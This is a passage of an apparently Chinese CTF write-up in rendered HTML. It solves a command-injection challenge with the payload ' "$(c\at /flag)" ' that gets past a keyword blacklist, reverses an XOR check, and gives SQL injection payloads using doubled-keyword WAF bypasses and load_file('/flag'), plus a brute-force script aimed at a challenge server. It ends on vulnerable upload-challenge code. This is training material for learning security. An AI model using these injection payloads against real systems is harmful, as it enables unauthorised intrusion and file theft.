+<a id="__codelineno-10-30" name="__codelineno-10-30"></a><a href="#__codelineno-10-30"><span class="linenos" data-linenos="30 "></span></a><span class="w">          </span><span class="n">snprintf</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="mh">0x100uLL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%s %s %s&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;echo &#39;&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&#39; string&quot;</span><span class="p">);</span>
+<a id="__codelineno-10-31" name="__codelineno-10-31"></a><a href="#__codelineno-10-31"><span class="linenos" data-linenos="31 "></span></a><span class="w">          </span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+<a id="__codelineno-10-32" name="__codelineno-10-32"></a><a href="#__codelineno-10-32"><span class="linenos" data-linenos="32 "></span></a><span class="w">          </span><span class="k">break</span><span class="p">;</span>
+<a id="__codelineno-10-33" name="__codelineno-10-33"></a><a href="#__codelineno-10-33"><span class="linenos" data-linenos="33 "></span></a><span class="w">      </span><span class="p">}</span>
+</code></pre></div>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><a href="#__codelineno-11-1"><span class="linenos" data-linenos="1 "></span></a>看到选项2有一个system，拼接输入的字符串buf，但是buf禁用了&#39;;&#39;,&#39;`&#39;,&#39;|&#39;,&#39;/&#39;,&#39;&amp;&#39;,&quot;cat&quot;,&quot;sh&quot;
+<a id="__codelineno-11-2" name="__codelineno-11-2"></a><a href="#__codelineno-11-2"><span class="linenos" data-linenos="2 "></span></a>有单引号，不能使用“|”和“&amp;” ,不能使用管道的方式.
+<a id="__codelineno-11-3" name="__codelineno-11-3"></a><a href="#__codelineno-11-3"><span class="linenos" data-linenos="3 "></span></a>没有禁用$()，
+<a id="__codelineno-11-4" name="__codelineno-11-4"></a><a href="#__codelineno-11-4"><span class="linenos" data-linenos="4 "></span></a>可以利用$()进行getshell
+</code></pre></div>
+<div class="language-shell highlight"><span class="filename">Bash</span><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1"></a><a href="#__codelineno-12-1"><span class="linenos" data-linenos="1 "></span></a><span class="s1">&#39; &quot;$(c\at /flag)&quot; &#39;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2"></a><a href="#__codelineno-12-2"><span class="linenos" data-linenos="2 "></span></a><span class="c1"># 第一个单引号闭合前面的单引号</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3"></a><a href="#__codelineno-12-3"><span class="linenos" data-linenos="3 "></span></a><span class="c1"># \a 转义绕过cat</span>
+</code></pre></div></p>
+<p>nc连接以后，输入2，输入<code>' "$(c\at /flag)" '</code> 获得flag</p>
+<h2 id="reverse_1">reverse</h2>
+<h3 id="real-checkin-xor">real checkin xor</h3>
+<h5 id="_13">解题过程</h5>
+<h6 id="_14">题目脚本</h6>
+<p><div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1"></a><a href="#__codelineno-13-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="k">def</span> <span class="nf">verify_func</span><span class="p">(</span><span class="n">ciper</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2"></a><a href="#__codelineno-13-2"><span class="linenos" data-linenos=" 2 "></span></a>    <span class="n">encrypted</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3"></a><a href="#__codelineno-13-3"><span class="linenos" data-linenos=" 3 "></span></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ciper</span><span class="p">)):</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4"></a><a href="#__codelineno-13-4"><span class="linenos" data-linenos=" 4 "></span></a>        <span class="n">encrypted</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">ciper</span><span class="p">[</span><span class="n">i</span><span class="p">])</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5"></a><a href="#__codelineno-13-5"><span class="linenos" data-linenos=" 5 "></span></a>    <span class="k">return</span> <span class="n">encrypted</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6"></a><a href="#__codelineno-13-6"><span class="linenos" data-linenos=" 6 "></span></a>
+<a id="__codelineno-13-7" name="__codelineno-13-7"></a><a href="#__codelineno-13-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="mi">7</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">24</span><span class="p">]</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8"></a><a href="#__codelineno-13-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;这是一个保险箱,你能输入相关的key来进行解密吗?&quot;</span><span class="p">)</span>
+<a id="__codelineno-13-9" name="__codelineno-13-9"></a><a href="#__codelineno-13-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="n">input_line</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;请输入key &gt; &quot;</span><span class="p">)</span>
+<a id="__codelineno-13-10" name="__codelineno-13-10"></a><a href="#__codelineno-13-10"><span class="linenos" data-linenos="10 "></span></a><span class="k">if</span> <span class="n">verify_func</span><span class="p">(</span><span class="n">input_line</span><span class="p">,</span><span class="s2">&quot;ez_python_xor_reverse&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="n">secret</span><span class="p">:</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11"></a><a href="#__codelineno-13-11"><span class="linenos" data-linenos="11 "></span></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;密码正确&quot;</span><span class="p">)</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12"></a><a href="#__codelineno-13-12"><span class="linenos" data-linenos="12 "></span></a><span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-13-13" name="__codelineno-13-13"></a><a href="#__codelineno-13-13"><span class="linenos" data-linenos="13 "></span></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;密码错误&quot;</span><span class="p">)</span>
+</code></pre></div>
+题目分析：</p>
+<p>secret为正确加密后的密码
+输入key，ord后与<code>ez_python_xor_reverse</code>异或
+异或是可逆的，secret与<code>ez_python_xor_reverse</code>异或就能得到原文</p>
+<h6 id="_15">解题脚本</h6>
+<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1"></a><a href="#__codelineno-14-1"><span class="linenos" data-linenos="1 "></span></a><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="mi">7</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">24</span><span class="p">]</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2"></a><a href="#__codelineno-14-2"><span class="linenos" data-linenos="2 "></span></a><span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;ez_python_xor_reverse&quot;</span>
+<a id="__codelineno-14-3" name="__codelineno-14-3"></a><a href="#__codelineno-14-3"><span class="linenos" data-linenos="3 "></span></a><span class="n">encrypted</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4"></a><a href="#__codelineno-14-4"><span class="linenos" data-linenos="4 "></span></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">secret</span><span class="p">)):</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5"></a><a href="#__codelineno-14-5"><span class="linenos" data-linenos="5 "></span></a>    <span class="n">encrypted</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6"></a><a href="#__codelineno-14-6"><span class="linenos" data-linenos="6 "></span></a><span class="nb">print</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
+<a id="__codelineno-14-7" name="__codelineno-14-7"></a><a href="#__codelineno-14-7"><span class="linenos" data-linenos="7 "></span></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span><span class="n">encrypted</span><span class="p">)):</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8"></a><a href="#__codelineno-14-8"><span class="linenos" data-linenos="8 "></span></a>    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</code></pre></div>
+<h2 id="web">WEB</h2>
+<h3 id="sql">sql教学局</h3>
+<h6 id="flag-pyaload">第一段flag-pyaload</h6>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a><a href="#__codelineno-15-1"><span class="linenos" data-linenos="1 "></span></a>?user=&#39;/**/unioN/**/seleselectct/**/
+<a id="__codelineno-15-2" name="__codelineno-15-2"></a><a href="#__codelineno-15-2"><span class="linenos" data-linenos="2 "></span></a>(seselectlect/**/`3`/**/frfromom/**/
+<a id="__codelineno-15-3" name="__codelineno-15-3"></a><a href="#__codelineno-15-3"><span class="linenos" data-linenos="3 "></span></a>(sselectelect/**/1,2,3/**/union/**/
+<a id="__codelineno-15-4" name="__codelineno-15-4"></a><a href="#__codelineno-15-4"><span class="linenos" data-linenos="4 "></span></a>seselectlect/**/*/**/frfromom/**/
+<a id="__codelineno-15-5" name="__codelineno-15-5"></a><a href="#__codelineno-15-5"><span class="linenos" data-linenos="5 "></span></a>secret.passwoorrd)a/**/limit/**/1,1)/**/where/**/&#39;1
+</code></pre></div>
+<h6 id="flag-payload">第二段flag(错误)-payload</h6>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1"></a><a href="#__codelineno-16-1"><span class="linenos" data-linenos="1 "></span></a>?user=&#39;/**/unioN/**/seleselectct/**/grade
+<a id="__codelineno-16-2" name="__codelineno-16-2"></a><a href="#__codelineno-16-2"><span class="linenos" data-linenos="2 "></span></a>/**/frofromm/**/scoorre/**/where/**/&#39;1
+</code></pre></div>
+<h6 id="flag-payload_1">第二段flag(正确)-payload</h6>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1"></a><a href="#__codelineno-17-1"><span class="linenos" data-linenos="1 "></span></a>&#39;/**/unioN/**/seleselectct/**/
+<a id="__codelineno-17-2" name="__codelineno-17-2"></a><a href="#__codelineno-17-2"><span class="linenos" data-linenos="2 "></span></a>(seselectlect/**/`1`/**/frfromom/**/
+<a id="__codelineno-17-3" name="__codelineno-17-3"></a><a href="#__codelineno-17-3"><span class="linenos" data-linenos="3 "></span></a>(sselectelect/**/1,2/**/union/**/
+<a id="__codelineno-17-4" name="__codelineno-17-4"></a><a href="#__codelineno-17-4"><span class="linenos" data-linenos="4 "></span></a>seselectlect/**/*/**/frfromom/**/scoorre/**/)
+<a id="__codelineno-17-5" name="__codelineno-17-5"></a><a href="#__codelineno-17-5"><span class="linenos" data-linenos="5 "></span></a>a/**/limit/**/354,1)/**/where/**/&#39;1
+</code></pre></div>
+<h6 id="-">第二段-爆破脚本</h6>
+<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1"></a><a href="#__codelineno-18-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="kn">import</span> <span class="nn">requests</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2"></a><a href="#__codelineno-18-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi">500</span><span class="p">):</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3"></a><a href="#__codelineno-18-3"><span class="linenos" data-linenos=" 3 "></span></a>    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4"></a><a href="#__codelineno-18-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="s2">    http://101.32.220.189:31120/challenge.php?user=</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5"></a><a href="#__codelineno-18-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="s2">    &#39;/**/unioN/**/seleselectct/**/(seselectlect/**/`2`</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6"></a><a href="#__codelineno-18-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="s2">    /**/frfromom/**/(sselectelect/**/1,2/**/union/**/</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7"></a><a href="#__codelineno-18-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="s2">    seselectlect/**/*/**/frfromom/**/scoorre/**/)a/**/limit/**/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1)</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8"></a><a href="#__codelineno-18-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="s2">    /**/where/**/&#39;1</span>
+<a id="__codelineno-18-9" name="__codelineno-18-9"></a><a href="#__codelineno-18-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="s2">    &quot;&quot;&quot;</span><span class="p">)</span>
+<a id="__codelineno-18-10" name="__codelineno-18-10"></a><a href="#__codelineno-18-10"><span class="linenos" data-linenos="10 "></span></a>    <span class="n">html</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span>
+<a id="__codelineno-18-11" name="__codelineno-18-11"></a><a href="#__codelineno-18-11"><span class="linenos" data-linenos="11 "></span></a>    <span class="n">name</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;查询结果: &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>  <span class="c1"># 不想用正则</span>
+<a id="__codelineno-18-12" name="__codelineno-18-12"></a><a href="#__codelineno-18-12"><span class="linenos" data-linenos="12 "></span></a>    <span class="nb">print</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+<a id="__codelineno-18-13" name="__codelineno-18-13"></a><a href="#__codelineno-18-13"><span class="linenos" data-linenos="13 "></span></a>    <span class="k">if</span> <span class="s1">&#39;beg&#39;</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+<a id="__codelineno-18-14" name="__codelineno-18-14"></a><a href="#__codelineno-18-14"><span class="linenos" data-linenos="14 "></span></a>        <span class="nb">print</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
+<a id="__codelineno-18-15" name="__codelineno-18-15"></a><a href="#__codelineno-18-15"><span class="linenos" data-linenos="15 "></span></a>        <span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+<h6 id="flag-payload_2">第三段flag-payload</h6>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1"></a><a href="#__codelineno-19-1"><span class="linenos" data-linenos="1 "></span></a>?user=&#39;/**/unioN/**/seleselectct/**/
+<a id="__codelineno-19-2" name="__codelineno-19-2"></a><a href="#__codelineno-19-2"><span class="linenos" data-linenos="2 "></span></a>loloadad_file(&#39;/flag&#39;)/**/where/**/&#39;1
+</code></pre></div>
+<h6 id="php">php部分代码</h6>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1"></a><a href="#__codelineno-20-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="cp">&lt;?php</span> <span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2"></a><a href="#__codelineno-20-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3"></a><a href="#__codelineno-20-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="nv">$password</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4"></a><a href="#__codelineno-20-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="nv">$database</span> <span class="o">=</span> <span class="s1">&#39;ctf&#39;</span><span class="p">;</span>
+<a id="__codelineno-20-5" name="__codelineno-20-5"></a><a href="#__codelineno-20-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$database</span><span class="p">);</span>
+<a id="__codelineno-20-6" name="__codelineno-20-6"></a><a href="#__codelineno-20-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-20-7" name="__codelineno-20-7"></a><a href="#__codelineno-20-7"><span class="linenos" data-linenos=" 7 "></span></a>    <span class="k">die</span><span class="p">(</span><span class="s2">&quot;连接失败: &quot;</span> <span class="o">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">connect_error</span><span class="p">);</span>
+<a id="__codelineno-20-8" name="__codelineno-20-8"></a><a href="#__codelineno-20-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="p">}</span>
+<a id="__codelineno-20-9" name="__codelineno-20-9"></a><a href="#__codelineno-20-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="nv">$query</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<a id="__codelineno-20-10" name="__codelineno-20-10"></a><a href="#__codelineno-20-10"><span class="linenos" data-linenos="10 "></span></a><span class="nv">$resultText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+<a id="__codelineno-20-11" name="__codelineno-20-11"></a><a href="#__codelineno-20-11"><span class="linenos" data-linenos="11 "></span></a><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span>
+<a id="__codelineno-20-12" name="__codelineno-20-12"></a><a href="#__codelineno-20-12"><span class="linenos" data-linenos="12 "></span></a><span class="p">{</span>
+<a id="__codelineno-20-13" name="__codelineno-20-13"></a><a href="#__codelineno-20-13"><span class="linenos" data-linenos="13 "></span></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/regexp|left|floor|reverse|update|between|=|&gt;|&lt;|and|\|right|substr|replace|char|&amp;|\\\$|sleep| /i&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
+<a id="__codelineno-20-14" name="__codelineno-20-14"></a><a href="#__codelineno-20-14"><span class="linenos" data-linenos="14 "></span></a>        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="k">false</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<a id="__codelineno-20-15" name="__codelineno-20-15"></a><a href="#__codelineno-20-15"><span class="linenos" data-linenos="15 "></span></a>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<a id="__codelineno-20-16" name="__codelineno-20-16"></a><a href="#__codelineno-20-16"><span class="linenos" data-linenos="16 "></span></a>        <span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">&quot;/(select|from|load|or)/i&quot;</span><span class="p">;</span>
+<a id="__codelineno-20-17" name="__codelineno-20-17"></a><a href="#__codelineno-20-17"><span class="linenos" data-linenos="17 "></span></a>        <span class="nv">$input</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+<a id="__codelineno-20-18" name="__codelineno-20-18"></a><a href="#__codelineno-20-18"><span class="linenos" data-linenos="18 "></span></a>        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="k">true</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+<a id="__codelineno-20-19" name="__codelineno-20-19"></a><a href="#__codelineno-20-19"><span class="linenos" data-linenos="19 "></span></a>    <span class="p">}</span>
+<a id="__codelineno-20-20" name="__codelineno-20-20"></a><a href="#__codelineno-20-20"><span class="linenos" data-linenos="20 "></span></a><span class="p">}</span>
+<a id="__codelineno-20-21" name="__codelineno-20-21"></a><a href="#__codelineno-20-21"><span class="linenos" data-linenos="21 "></span></a><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REQUEST_METHOD&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;GET&quot;</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<a id="__codelineno-20-22" name="__codelineno-20-22"></a><a href="#__codelineno-20-22"><span class="linenos" data-linenos="22 "></span></a>    <span class="nv">$wafOutput</span> <span class="o">=</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]);</span>
+<a id="__codelineno-20-23" name="__codelineno-20-23"></a><a href="#__codelineno-20-23"><span class="linenos" data-linenos="23 "></span></a>    <span class="k">if</span> <span class="p">(</span><span class="nv">$wafOutput</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-20-24" name="__codelineno-20-24"></a><a href="#__codelineno-20-24"><span class="linenos" data-linenos="24 "></span></a>        <span class="nv">$resultText</span> <span class="o">=</span> <span class="s2">&quot;WAF!!!&quot;</span><span class="p">;</span>
+<a id="__codelineno-20-25" name="__codelineno-20-25"></a><a href="#__codelineno-20-25"><span class="linenos" data-linenos="25 "></span></a>    <span class="p">}</span>
+<a id="__codelineno-20-26" name="__codelineno-20-26"></a><a href="#__codelineno-20-26"><span class="linenos" data-linenos="26 "></span></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="zupload">zupload</h3>
+<h5 id="_16">题目</h5>
+<div class="language-php highlight"><span class="filename">PHP</span><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1"></a><a href="#__codelineno-21-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2"></a><a href="#__codelineno-21-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3"></a><a href="#__codelineno-21-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4"></a><a href="#__codelineno-21-4"><span class="linenos" data-linenos=" 4 "></span></a>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<a id="__codelineno-21-5" name="__codelineno-21-5"></a><a href="#__codelineno-21-5"><span class="linenos" data-linenos=" 5 "></span></a>        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: /?action=upload&#39;</span><span class="p">);</span>
+<a id="__codelineno-21-6" name="__codelineno-21-6"></a><a href="#__codelineno-21-6"><span class="linenos" data-linenos=" 6 "></span></a>        <span class="k">die</span><span class="p">();</span>
+<a id="__codelineno-21-7" name="__codelineno-21-7"></a><a href="#__codelineno-21-7"><span class="linenos" data-linenos=" 7 "></span></a>    <span class="p">}</span>
+<a id="__codelineno-21-8" name="__codelineno-21-8"></a><a href="#__codelineno-21-8"><span class="linenos" data-linenos=" 8 "></span></a>    <span class="k">die</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]));</span>
+<a id="__codelineno-21-9" name="__codelineno-21-9"></a><a href="#__codelineno-21-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-21-10" name="__codelineno-21-10"></a><a href="#__codelineno-21-10"><span class="linenos" data-linenos="10 "></span></a>    <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
+<a id="__codelineno-21-11" name="__codelineno-21-11"></a><a href="#__codelineno-21-11"><span class="linenos" data-linenos="11 "></span></a>        <span class="s1">&#39;status&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;error&#39;</span><span class="p">,</span>
